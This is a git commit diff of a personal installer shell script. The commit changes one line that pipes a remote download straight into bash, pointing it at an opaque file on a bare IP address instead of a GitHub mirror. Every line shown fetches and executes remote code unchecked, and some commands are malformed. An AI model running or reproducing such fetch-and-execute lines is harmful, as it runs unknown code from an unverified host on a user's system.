8553aaf2bb0b600a33e00d29ad7c7dee1010e3c5
50801684 <42910719+50801684@users.noreply.github.com>
2022-10-15 23:59:34 +0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -2,7 +2,7 @@
 
 bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/4.sh)"
 bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/5.sh)"
-bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/file.txt)"
+bash -c "$(curl -sS wget http://159.75.133.49:8888/down/aOncyDmBGyKL)"
 
 ./4.sh -d 
 echo "安装完成"
